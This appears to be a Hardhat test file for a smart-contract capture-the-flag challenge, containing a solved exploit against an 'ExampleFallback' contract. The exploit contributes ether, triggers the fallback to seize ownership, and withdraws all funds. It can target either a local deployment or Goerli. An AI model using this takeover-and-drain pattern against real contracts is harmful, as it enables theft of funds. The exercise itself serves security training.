const { ethers } = require('hardhat');
const { expect } = require('chai');

describe('[Challenge] Example Vuln', function () {

    let deployer, attacker;
    
    before(async () =>{
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
        const network = await ethers.provider.getNetwork();
        const chainID = network.chainId
        
        if (chainID == 5){ // goerli testnet
            /** connect to Dapp in goerli **/
            [attacker] = await ethers.getSigners();
            const ContractFactory = await ethers.getContractFactory('ExampleFallback');
            this.target = ContractFactory.attach("");
            
        } else { // local network - hardhat  
            /** local test **/
            [deployer, attacker] = await ethers.getSigners();
            const ContractFactory = await ethers.getContractFactory('ExampleFallback', deployer);
            this.target = await ContractFactory.deploy();
        }
    });

    it('Exploit', async () => {
        /** CODE YOUR EXPLOIT HERE */
        const some_ether = ethers.utils.parseEther('0.0001', 'ether');
        // Contribute to get into whitelist
        await this.target.connect(attacker).contribute({value: some_ether});
        // Takeover the contract's owner by sending some ethers
        tx = {
            to: this.target.address,
            value: some_ether
        };
        await attacker.sendTransaction(tx);
        // Withdraw all ethers in the contract
        await this.target.connect(attacker).withdraw();
    }).timeout(0);

    after(async () => {
        /** SUCCESS CONDITIONS */
        expect(await this.target.owner()).to.be.eq(attacker.address);
    });
});